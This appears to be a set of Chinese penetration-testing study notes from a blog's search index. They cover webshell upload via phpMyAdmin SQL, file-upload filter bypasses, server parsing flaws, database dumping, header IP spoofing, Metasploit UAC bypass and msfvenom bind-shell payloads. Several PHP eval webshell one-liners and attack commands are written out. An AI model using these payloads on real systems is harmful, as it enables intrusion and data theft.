+<h2 id="口令爆破"><a href="#口令爆破" class="headerlink" title="口令爆破"></a>口令爆破</h2><ul>
+<li>github上有爆破工具</li>
+</ul>
+<h2 id="远程代码执行等漏洞利用"><a href="#远程代码执行等漏洞利用" class="headerlink" title="远程代码执行等漏洞利用"></a>远程代码执行等漏洞利用</h2><h2 id="后台bypass（万能密码）"><a href="#后台bypass（万能密码）" class="headerlink" title="后台bypass（万能密码）"></a>后台bypass（万能密码）</h2><ul>
+<li>phpmyadmin2.11.3-2.11.4  用户名填入‘localhost’@‘@”不用密码可以直接登录</li>
+<li>phpmyadmin2.11.9.2  存在空口令，直接root登录不用密码。</li>
+</ul>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol>
+<li><p>物理路径获取</p>
+<ul>
+<li>各种报错</li>
+<li>google hacking ：Site:xxx.edu.tw warning、Site:xxx.com.tw “atal error”</li>
+<li>默认路径</li>
+<li>读取解析器配置文件  select @@basedir</li>
+<li>旁站</li>
+<li>各种信息泄露</li>
+</ul>
+</li>
+<li><p>通过日志拿shell</p>
+<ul>
+<li><p>set global general_log=’on’ //首先设置为on</p>
+<p>set global general_log_file =”E:\wamp\wamp\www\3.php”  //设置日志路径</p>
+<p>select “<?php eval($_POST['mima'])?>“;   //一句话写入</p>
+</li>
+</ul>
+</li>
+<li><p>导出拿shell</p>
+<ul>
+<li><p>SELECT “<?php phpinfo();?>“ INTO OUTFILE “E:\wamp\wamp\www\2.php”</p>
+</li>
+<li><p>SELECT “<?php phpinfo();?>“ INTO dumpFILE “E:\wamp\wamp\www\2.php”</p>
+</li>
+<li><p>创建表导出：</p>
+<p>CREATE TABLE a (cmd text NOT NULL);<br>INSERT INTO a (cmd) VALUES(‘<?php eval($_POST[1]);?>‘);<br>select cmd from a into outfile ‘D:/phpMyAdmin/libraries/d.php’;<br>DROP TABLE IF EXISTS a;</p>
+</li>
+<li><p>猥琐型导出：</p>
+<p>select * from admin where userid=1 into outfile “x:\wwwroot\sx.php” LINES STARTING BY<br>0x3C3F70687020706870696E666F28293F3E%23。写完语句最好用url编码一下</p>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="phpinfo页面信息"><a href="#phpinfo页面信息" class="headerlink" title="phpinfo页面信息"></a>phpinfo页面信息</h1><h2 id="能获取到的信息"><a href="#能获取到的信息" class="headerlink" title="能获取到的信息"></a>能获取到的信息</h2><ul>
+<li><p>操作系统：System</p>
+</li>
+<li><p>物理路径：_ENV[“SCRIPT_FILENAME”]</p>
+</li>
+<li><p>真实IP：_SERVER[“SERVER_ADDR”]</p>
+</li>
+<li><p>Web服务器版本：_SERVER[“SERVER_SOFTWARE”]</p>
+</li>
+<li><p>远程包含：allow_url_include</p>
+</li>
+<li><p>被禁函数：disable_functions</p>
+<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>
+</li>
+</ul>
+<h2 id="拓展渗透"><a href="#拓展渗透" class="headerlink" title="拓展渗透"></a>拓展渗透</h2><ul>
+<li><p>server api</p>
+</li>
+<li><p>phpinfo-lfi</p>
+<p><a href="https://www.freebuf.com/articles/web/79830.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/79830.html</a></p>
+<p><a href="https://seaii-blog.com/index.php/2017/10/25/73.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2017/10/25/73.html</a></p>
+</li>
+</ul>
+<h1 id="网站备份"><a href="#网站备份" class="headerlink" title="网站备份"></a>网站备份</h1><h2 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h2><ul>
+<li>目录扫描（7kbscan）<ul>
+<li>backup.rar</li>
+<li>back.zip</li>
+</ul>
+</li>
+<li>网站备份扫描器</li>
+<li>其他漏洞<ul>
+<li>目录遍历</li>
+</ul>
+</li>
+</ul>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><ul>
+<li>获取源码进行代码审计（注入，上传，越权）</li>
+<li>寻找配置文件尝试连接数据库</li>
+<li>寻找后台尝试弱口令</li>
+<li>查找各种敏感文件（说明文件，密码问题…）</li>
+<li>别人留下的shell（webshell查杀工具）</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6817" target="_blank" rel="noopener">https://xz.aliyun.com/t/6817</a></p>
+<h1 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h1><h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><ul>
+<li>大批量数据导出会执行很多请求</li>
+<li>盲注效率很低</li>
+</ul>
+<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p>–dump    –start    –stop</p>
+<h2 id="K8飞刀"><a href="#K8飞刀" class="headerlink" title="K8飞刀"></a>K8飞刀</h2><h2 id="Burp的intruder模块"><a href="#Burp的intruder模块" class="headerlink" title="Burp的intruder模块"></a>Burp的intruder模块</h2><h2 id="拖库webshell"><a href="#拖库webshell" class="headerlink" title="拖库webshell"></a>拖库webshell</h2><ul>
+<li>phpspy　<a href="https://www.webshell.cc/4422.html" target="_blank" rel="noopener">https://www.webshell.cc/4422.html</a></li>
+<li>adminer　<a href="https://www.adminer.org/" target="_blank" rel="noopener">https://www.adminer.org/</a></li>
+</ul>
+<h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><ul>
+<li>navicat premium  <a href="https://segmentfault.com/a/1190000015957785" target="_blank" rel="noopener">https://segmentfault.com/a/1190000015957785</a></li>
+<li>文件占用   强制复制windows文件</li>
+<li>命令压缩：mackecab \ rar \7z   <a href="https://blog.csdn.net/cosmoslife/article/details/8499773" target="_blank" rel="noopener">https://blog.csdn.net/cosmoslife/article/details/8499773</a></li>
+</ul>
+<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><ul>
+<li>mysqldump</li>
+<li>phpmyadmin</li>
+<li>navicat premium</li>
+</ul>
+<h2 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h2><ul>
+<li>navicat premium     <a href="http://www.sqltools.net" target="_blank" rel="noopener">www.sqltools.net</a></li>
+</ul>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://musec.lofter.com/post/303379_a98d0d5" target="_blank" rel="noopener">http://musec.lofter.com/post/303379_a98d0d5</a></li>
+<li><a href="https://www.t00ls.net/articles-24256.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-24256.html</a></li>
+</ul>
+<h1 id="HTTP请求源IP伪造"><a href="#HTTP请求源IP伪造" class="headerlink" title="HTTP请求源IP伪造"></a>HTTP请求源IP伪造</h1><ul>
+<li>有些目标站点配置了只允许特定IP访问，但目标验证源IP不够严苛的情况下，可以通过伪造IP来达到访问某些web应用的目的。利用前提是目标站点判断IP是通过请求头获取的。</li>
+</ul>
+<h2 id="出现点"><a href="#出现点" class="headerlink" title="出现点"></a>出现点</h2><ul>
+<li>网站管理后台</li>
+</ul>
+<h2 id="伪造方法"><a href="#伪造方法" class="headerlink" title="伪造方法"></a>伪造方法</h2><ul>
+<li>在HTTP请求包中加入特定请求头和值</li>
+</ul>
+<p>X-Forwarded-For: 192.168.0.91<br>X-Originating-IP: 192.168.0.92<br>X-Remote-IP: 192.168.0.93<br>X-Remote-Addr: 192.168.0.94<br>X-Client-IP: 192.168.0.95</p>
+<h2 id="可利用工具"><a href="#可利用工具" class="headerlink" title="可利用工具"></a>可利用工具</h2><ul>
+<li>burp</li>
+<li>插件</li>
+</ul>
+<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul>
+<li>不知道确切IP的时候，可以通过轮询的方法。已知网站是某个地区的，可以先找出该地区的IP段，用IP段中的IP一个个尝试。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>getshell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基于CMS的渗透</title>
+    <url>/2020/02/22/%E5%9F%BA%E4%BA%8ECMS%E7%9A%84%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>通过某项特征来识别，获得网站某个文件的MD5或者用正则表达式与字典里面的关键字进行匹配，如果匹配成功就说明这个站点是对应的CMS。</li>
+</ul>
+<h2 id="国内在线指纹识别"><a href="#国内在线指纹识别" class="headerlink" title="国内在线指纹识别"></a>国内在线指纹识别</h2><ul>
+<li>云悉：<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></li>
+<li>潮汐：<a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></li>
+<li>who am i ：<a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/</a></li>
+</ul>
+<h2 id="国外在线指纹识别"><a href="#国外在线指纹识别" class="headerlink" title="国外在线指纹识别"></a>国外在线指纹识别</h2><ul>
+<li><a href="https://whatcms.org/" target="_blank" rel="noopener">https://whatcms.org/</a></li>
+<li><a href="https://cmsdetect.com/" target="_blank" rel="noopener">https://cmsdetect.com/</a></li>
+<li><a href="https://itrack.ru/whatcms/" target="_blank" rel="noopener">https://itrack.ru/whatcms/</a></li>
+</ul>
+<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><ul>
+<li>robots.txt</li>
+<li>404报错</li>
+<li>….</li>
+</ul>
+<h1 id="如何渗透"><a href="#如何渗透" class="headerlink" title="如何渗透"></a>如何渗透</h1><p>因为这些cms都是开源的，安全工作者就会对这些源代码进审计（代码审计），很多CMS就会被爆出各种漏洞及其利用方式，我们只要把相应的请求发到到目标网站，就可成功利用。在搜索引擎上搜索相应漏洞即可。</p>
+<h1 id="DEDECMS（织梦）"><a href="#DEDECMS（织梦）" class="headerlink" title="DEDECMS（织梦）"></a>DEDECMS（织梦）</h1><ul>
+<li><a href="https://blog.szfszf.top/tech/dedecms-%e6%9c%80%e6%96%b0%e7%89%88%e6%bc%8f%e6%b4%9e%e6%94%b6%e9%9b%86%e5%b9%b6%e5%a4%8d%e7%8e%b0%e5%ad%a6%e4%b9%a0/" target="_blank" rel="noopener">https://blog.szfszf.top/tech/dedecms-%e6%9c%80%e6%96%b0%e7%89%88%e6%bc%8f%e6%b4%9e%e6%94%b6%e9%9b%86%e5%b9%b6%e5%a4%8d%e7%8e%b0%e5%ad%a6%e4%b9%a0/</a></li>
+<li><a href="https://xz.aliyun.com/t/4150" target="_blank" rel="noopener">https://xz.aliyun.com/t/4150</a> (图片马没执行换个小点的图片试试)</li>
+</ul>
+<h1 id="empireCMS（帝国）"><a href="#empireCMS（帝国）" class="headerlink" title="empireCMS（帝国）"></a>empireCMS（帝国）</h1><ul>
+<li><a href="https://www.cnblogs.com/yuzly/p/11369770.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11369770.html</a></li>
+<li><a href="https://www.cnblogs.com/yuzly/p/11359925.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11359925.html</a></li>
+</ul>
+<h1 id="PHPCMS"><a href="#PHPCMS" class="headerlink" title="PHPCMS"></a>PHPCMS</h1><ul>
+<li>安装的时候DNS解析要修改，install\install.php 49行的URL改成<a href="http://www.baidu.com或者其他能访问的域名" target="_blank" rel="noopener">www.baidu.com或者其他能访问的域名</a></li>
+<li><a href="https://www.hackersb.cn/hacker/219.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/219.html</a><ul>
+<li>用户名每次需要更改</li>
+<li>远程服务器的一句话，如果要让目标服务器下载，是不能让这个文件被解析的。可以在没有安装php的服务器上上传一个php一句话让目标访问就能下载。</li>
+</ul>
+</li>
+</ul>
+<h1 id="discuz"><a href="#discuz" class="headerlink" title="discuz"></a>discuz</h1><ul>
+<li>现在修复了很多。具体可以去搜以前的资料</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传攻击</title>
+    <url>/2020/02/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h1 id="找上传点"><a href="#找上传点" class="headerlink" title="找上传点"></a>找上传点</h1><ul>
+<li>管理后台</li>
+<li>用户后台</li>
+<li>前台页面</li>
+<li>目录扫描</li>
+</ul>
+<h1 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h1><ol>
+<li>分析目标架构<ul>
+<li>后端语言、中间件、服务器类型，版本。</li>
+</ul>
+</li>
+<li>根据分析结果使用已有手段依次测试</li>
+<li>图片马将一句话加在图片最后上传</li>
+</ol>
+<h1 id="前端验证突破"><a href="#前端验证突破" class="headerlink" title="前端验证突破"></a>前端验证突破</h1><ul>
+<li>审查元素，修改限制</li>
+<li>burp抓包，修改内容</li>
+<li>浏览器禁用js脚本</li>
+</ul>
+<h1 id="文件内容检查突破"><a href="#文件内容检查突破" class="headerlink" title="文件内容检查突破"></a>文件内容检查突破</h1><h2 id="文件内容检查类型"><a href="#文件内容检查类型" class="headerlink" title="文件内容检查类型"></a>文件内容检查类型</h2><ul>
+<li>content-type检查</li>
+<li>文件头检查</li>
+<li>getimagesize()检查</li>
+<li>php_exif模块检查</li>
+<li>imagecreatefromjpeg二次渲染</li>
+</ul>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ul>
+<li>先上传正常图片看上传功能是否正常</li>
+<li>直接上传图片马可绕过content-type，文件头，gerimagsiz()，php_exif检查</li>
+<li>针对二次渲染，寻找图片数据中不会被转换的部分将代码插入其中</li>
+</ul>
+<h2 id="content-type检查"><a href="#content-type检查" class="headerlink" title="content-type检查"></a>content-type检查</h2><ul>
+<li>使用burp suite抓包直接修改content-type值</li>
+</ul>
+<h2 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h2><ul>
+<li>在文件头部添加gif89a</li>
+<li>图片插入一句话</li>
+<li>结合文件包含漏洞或解析漏洞</li>
+</ul>
+<h2 id="getimagesize-检查和php-exif模块检查"><a href="#getimagesize-检查和php-exif模块检查" class="headerlink" title="getimagesize()检查和php_exif模块检查"></a>getimagesize()检查和php_exif模块检查</h2><ul>
+<li>绕过方法同上</li>
+</ul>
+<h2 id="imagecreatefromjpeg二次渲染"><a href="#imagecreatefromjpeg二次渲染" class="headerlink" title="imagecreatefromjpeg二次渲染"></a>imagecreatefromjpeg二次渲染</h2><ul>
+<li>寻找渲染前后不变的地方，替换成一句话。最好用一个比对工具。</li>
+</ul>
+<h1 id="白名单验证突破"><a href="#白名单验证突破" class="headerlink" title="白名单验证突破"></a>白名单验证突破</h1><h2 id="修改MIME类型绕过（Content-type验证）"><a href="#修改MIME类型绕过（Content-type验证）" class="headerlink" title="修改MIME类型绕过（Content-type验证）"></a>修改MIME类型绕过（Content-type验证）</h2><h2 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="00截断绕过"></a>00截断绕过</h2><ul>
+<li>条件：php版本小于5.3.4–CVE-2006-7243，phpmagic_quotes_gpc为OFF状态</li>
+<li>GET和POST请求进行截断时的区别：post不会像get对%00进行解码，所以需要在十六进制中手动修改。</li>
+<li>路径可控可在路径截断，文件名可控可在文件名截断。1.php%00</li>
+</ul>
+<h2 id="解析漏洞绕过"><a href="#解析漏洞绕过" class="headerlink" title="解析漏洞绕过"></a>解析漏洞绕过</h2><ul>
+<li>双重扩展名：apache 文件名解析时，是从后面开始检查后缀，按最后一个合法后缀执行。如： shell.php.xxx，xxx不会被解析，这个文件会被当做php文件解析。黑名单比较好用，白名单条件比较苛刻。</li>
+<li>iis6.0：*.asp;1.jpg</li>
+<li>iis7.0/7.5/Nginx&lt;8.03：php.ini⾥默认cgi.fix_pathinfo=1，对其进行访问的时候，在URL路径后添加.php后缀名会当做php文件进行解析。上传1.jpg，访问<a href="http://www.xxx.com/1.jpg/.php，此时1.jpg会被当做PHP脚本文件来解析。" target="_blank" rel="noopener">http://www.xxx.com/1.jpg/.php，此时1.jpg会被当做PHP脚本文件来解析。</a></li>
+</ul>
+<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><h1 id="黑名单验证突破"><a href="#黑名单验证突破" class="headerlink" title="黑名单验证突破"></a>黑名单验证突破</h1><h2 id="操作系统特性"><a href="#操作系统特性" class="headerlink" title="操作系统特性"></a>操作系统特性</h2><ul>
+<li>Windows对大小写不敏感</li>
+<li>Windows系统下，如果上传的文件名是test.php::$DATA会在服务器上.成.个test.php的文件，其中内容和所上传文件内容相同，并被解析。即上传文件xxx.php::$DATA = xxx.php</li>
+<li>Windows下文件名结尾加入.，空格，&lt;，&gt;，&gt;&gt;&gt;，0x81-0xff等字符会被自动去除</li>
+</ul>
+<h2 id="语言特性"><a href="#语言特性" class="headerlink" title="语言特性"></a>语言特性</h2><table>
+<thead>
+<tr>
+<th>语言</th>
+<th>可解析后缀</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php</td>
+<td>php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</td>
+</tr>
+<tr>
+<td>jsp</td>
+<td>jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</td>
+</tr>
+<tr>
+<td>asp/aspx</td>
+<td>asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</td>
+</tr>
+</tbody></table>
+<h2 id="中间件特性"><a href="#中间件特性" class="headerlink" title="中间件特性"></a>中间件特性</h2><ul>
+<li>解析漏洞：iis6.0，iis7.0/7.5，iis8.0/10.0 apache nginx tomcat  </li>
+<li>.htaccess：Apache在开启特定 模块的时候。</li>
+</ul>
+<h2 id="代码不严谨"><a href="#代码不严谨" class="headerlink" title="代码不严谨"></a>代码不严谨</h2><ul>
+<li>双写绕过</li>
+<li>对于空格，点只做了单次过滤</li>
+</ul>
+<h2 id="测试思路"><a href="#测试思路" class="headerlink" title="测试思路"></a>测试思路</h2><ul>
+<li>使用字典＋burp进行fuzz测试  <a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="noopener">https://github.com/c0ny1/upload-fuzz-dic-builder</a>  intrude里记得去掉payload encode这个选项</li>
+<li>手工</li>
+</ul>
+<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="探查web服务类型"><a href="#探查web服务类型" class="headerlink" title="探查web服务类型"></a>探查web服务类型</h2><ul>
+<li>查看http头</li>
+<li>用浏览器插件 wappalyzer</li>
+<li>第三方网站 <a href="http://www.yunsee.cn/info.html" target="_blank" rel="noopener">http://www.yunsee.cn/info.html</a></li>
+</ul>
+<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><ul>
+<li><p>iis5.x~6.0</p>
+<ul>
+<li>目录解析漏洞：服务器默认会把.asp，.asa目录下的文件都解析成asp文件。前提是可以控制文件上传的路径或者是文件名。xxx.asp/xxx.jpg</li>
+<li>文件名解析漏洞：服务器默认不会取解析分号后面的内容。前提是可以控制文件名。xx.asp;.jpg</li>
+<li>畸形文件名解析漏洞：iis6.0下的可执行文件还有asa、cer、cdx ，注意，不一定能解析aspx，因为aspx是.net环境。</li>
+</ul>
+</li>
+<li><p>IIS7.0/7.5/8.0</p>
+<ul>
+<li><p>利用解析图片中的代码上传webshell，如果开启Fast-CGI模式，上传1.jpg，内容如下：</p>
+<ul>
+<li><code>&lt;?PHP fputs(fopen(&#39;dark5.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></li>
+</ul>
+<p>访问1.jpg/.php ，那么1.jpg就会被解析执行。</p>
+</li>
+<li><p>fck+iis7.5：a.aspx.a.aspx.jpg..jpg</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Apach"><a href="#Apach" class="headerlink" title="Apach"></a>Apach</h2><ul>
+<li><p>不可识别解析后缀</p>
+<ul>
+<li>Apache的文件解析过程是从右到左开始判断解析,如果为不可识别的后缀解析,就再往左判断。</li>
+<li>在Apache的解析中，除了“php|php3|phtml”等规定的后缀中，任何的后缀加入，都是不会被识别解析的，也会被跳过后缀处理。test.php.k1.w2.a3 -&gt; test.php</li>
+</ul>
+</li>
+<li><p>.htaccess</p>
+<ul>
+<li><p>htaccess⽂件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+</li>
+<li><p>该漏洞适用于目标web服务器为apache，并且.htaccess可以被上传执行的情况。</p>
+</li>
+<li><p>当.htaccess⽂件内容为SetHandler application/x-httpd-php时，即设置当前目录所有文件都使⽤PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则报错。</p>
+</li>
+<li><p>在Apache中如果需要启动 .htaccess，必须在http.conf中设置 AllowOverride</p>
+<ul>
+<li><code>&lt;FilesMatch &quot;1.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><ul>
+<li>CGI 同上</li>
+<li>空字节代码执行：test.jpg%00.php</li>
+</ul>
+<h1 id="双文件上传和竞争上传"><a href="#双文件上传和竞争上传" class="headerlink" title="双文件上传和竞争上传"></a>双文件上传和竞争上传</h1><h2 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h2><ul>
+<li>应用场景<ul>
+<li>南方/良精CMS</li>
+<li>正则默认匹配第一个filename的情况</li>
+</ul>
+</li>
+<li>利用原理<ul>
+<li>服务端默认取第二个文件作为真正的上传文件，但是在检测时只检测了第一个文件。或者只验证了第一个filename的拓展名。</li>
+</ul>
+</li>
+<li>利用方法<ul>
+<li>直接在审查元素中添加一个上传表单</li>
+<li>burp抓包之后在数据包中添加</li>
+</ul>
+</li>
+</ul>
+<h2 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h2><ul>
+<li>应用场景：访问webshell的时候，短时间内可以访问到，再次访问就访问不到了。</li>
+<li>利用原理：代码逻辑为，先将文件上传到服务器，然后检测后缀名，如果不符合再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。</li>
+<li>利用方法：使用burp不停上传，同时用python脚本不停访问上传的文件。上传的文件访问到以后会生成一个一句话文件，只要访问成功一次就能写入。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>windows提权之UAC绕过</title>
+    <url>/2020/02/27/windows%E6%8F%90%E6%9D%83%E4%B9%8BUAC%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><ul>
+<li>用户账户控制，是Windows Vista及更高版本操作系统中采用的一种控制机制。</li>
+<li>一旦程序设计系统更改或是特定任务，除非以管理员权限运行，否则这些操作都将被阻止，没有管理员权限将不能进行以下操作：<ul>
+<li>注册表修改</li>
+<li>加载设备驱动程序</li>
+<li>DLL注入</li>
+<li>修改系统时间</li>
+<li>修改用户账户控制</li>
+<li>修改受保护的目录</li>
+<li>计划任务</li>
+</ul>
+</li>
+<li>参考文章：<a href="https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/" target="_blank" rel="noopener">https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/</a></li>
+</ul>
+<h1 id="用msf绕过UAC限制"><a href="#用msf绕过UAC限制" class="headerlink" title="用msf绕过UAC限制"></a>用msf绕过UAC限制</h1><p>利用以下模块：search bypassuac</p>
+<ul>
+<li>exploit/windows/local/bypassuac </li>
+<li>exploit/windows/local/bypassuac_comhijack </li>
+<li>exploit/windows/local/bypassuac_eventvwr</li>
+<li>exploit/windows/local/bypassuac_fodhelper</li>
+<li>exploit/windows/local/bypassuac_injection</li>
+<li>exploit/windows/local/bypassuac_injection_winsxs </li>
+<li>exploit/windows/local/bypassuac_silentcleanup </li>
+<li>exploit/windows/local/bypassuac_sluihijack </li>
+<li>exploit/windows/local/bypassuac_vbs</li>
+</ul>
+<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><ol>
+<li>获得session以后，先background把会话放到后台</li>
+<li>然后use bypassuac的模块</li>
+<li>set session id</li>
+<li>exploit以后会创建一个新的session</li>
+<li>session id+1 </li>
+</ol>
+]]></content>
+      <tags>
+        <tag>提权</tag>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网络篇</title>
+    <url>/2020/02/12/%E7%BD%91%E7%BB%9C%E7%AF%87/</url>
+    <content><![CDATA[<h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><ul>
+<li>由于以前入门的时候已经了解过相关知识，再复习一遍就当是查缺补漏.</li>
+</ul>
+<ol>
+<li>术语相关：<ul>
+<li>PoC，全称”Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。</li>
+<li>Exp，全称”Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</li>
+<li>Payload，中文“有效载荷”，指成功exploit之后，真正在目标系统执行的代码或指令。</li>
+<li>Shellcode，简单翻译“shell代码”，是Payload的一种，由于其建立正向/反向shell而得名。</li>
+</ul>
+</li>
+<li>ip相关：<ul>
+<li>A类1.0.0.0-126.0.0.0，大型网络。B类128.0.0.0-191.255.0.0，中等规模网络。C类192.0.0.0-223.255.255.0，小型网络。D类224.0.0.0-239.225.225.225，多路广播。E类240.0.0-247.255.255.255，保留地址。</li>
+<li>私有地址：A类：10.0.0.0-10.255.255.255。B类：172.16.0.0-172.31.255.255。C类：192.168.0.0-192.168.255.255。一般用在内网。 </li>
+<li>子网划分：网上有教程，计网复习也会用到，不多赘述。</li>
+<li>C段192.168.1.x-255.255.255.0</li>
+</ul>
+</li>
+<li>网络设备：<ul>
+<li>大多是概念性的，以后遇到的时候再深入。</li>
+</ul>
+</li>
+<li>端口：<ul>
+<li>对应不同的服务，根据服务来进行渗透。可以用来进行未授权访问、爆破之类的。</li>
+<li>扫描用nmap，使用方法资料很多，不多说。一般用的参数就-sS,-Pn。</li>
+</ul>
+</li>
+<li>HTTP协议：<ul>
+<li>这个也是很基础的东西，学了计网都知道。主要是要记住一些重要的请求头和状态码。</li>
+</ul>
+</li>
+<li>web通信和前后端：<ul>
+<li>也是计网的内容，不多说。主要是后端的服务要多了解一下。服务器：IIS，Apache，Tomcat等。解释器：.NET，PHP，JSP等。数据库：Access/Mssql，Mysql，Oracle等。脚本语言：ASP，PHP，JSP。都有不同的特性和常见漏洞。</li>
+</ul>
+</li>
+<li>网站搭建：<ul>
+<li>按视频里用的AWWserver。还是有点坑，安装完以后JSP死活运行不了。最后发现是JAVA环境变量的问题。修改完以后实在不行重启一下就好了。</li>
+</ul>
+</li>
+<li>本地靶场：<ul>
+<li>常见的DVWA。针对性的SQLi-abs。不多说，在线的也有。要多练习，理解原理。</li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>基础学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>msf的七个模块</title>
+    <url>/2020/02/26/msf%E7%9A%84%E4%B8%83%E4%B8%AA%E6%A8%A1%E5%9D%97/</url>
+    <content><![CDATA[<h1 id="七个模块"><a href="#七个模块" class="headerlink" title="七个模块"></a>七个模块</h1><p>模块都是用use命令使用，用info查看模块详细信息。show options查看配置信息。search搜索模块。</p>
+<ol>
+<li><p>exploit</p>
+<p>漏洞利用模块。对漏洞进行利用。</p>
+<ul>
+<li>使用方法：use 模块名，show target 查看模块支持的目标环境</li>
+<li>先对目标进行扫描，能够利用再执行攻击模块</li>
+<li>反弹回的是cmdshell可以更改payload返回一个meterpreter</li>
+</ul>
+</li>
+<li><p>payloads</p>
+<p>攻击载荷模块。可以执行反弹代码，添加用户等攻击。</p>
+<ol>
+<li><p>正向payload：会被防火墙拦截</p>
+<ul>
+<li><p>攻击者去连接目标服务器</p>
+</li>
+<li><p>使用场景：</p>
+<ul>
+<li>目标及其不给其他除特定端口外的端口出站</li>
+<li>目标处于深层网络，不能直接连通外网，其他机器开了防火墙，也不能通过其他机器连通，通过开着防火墙的机器端口转发达到穿透目的</li>
+</ul>
+</li>
+<li><p>案例：</p>
+<p>关闭防火墙：netsh firewall set opmode mode=disable</p>
+<ul>
+<li>msfvenom -p windows/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f exe &gt; /root/bind_xx.exe</li>
+<li>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f exe &gt;  /root/bind_xx.exe</li>
+<li>msfvenom -p windows/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f dll &gt; /root/bind_xx.dll</li>
+<li>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f dll &gt; /root/bind_xx.dll</li>
+<li>msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f elf &gt; /root/bind_xx.elf</li>
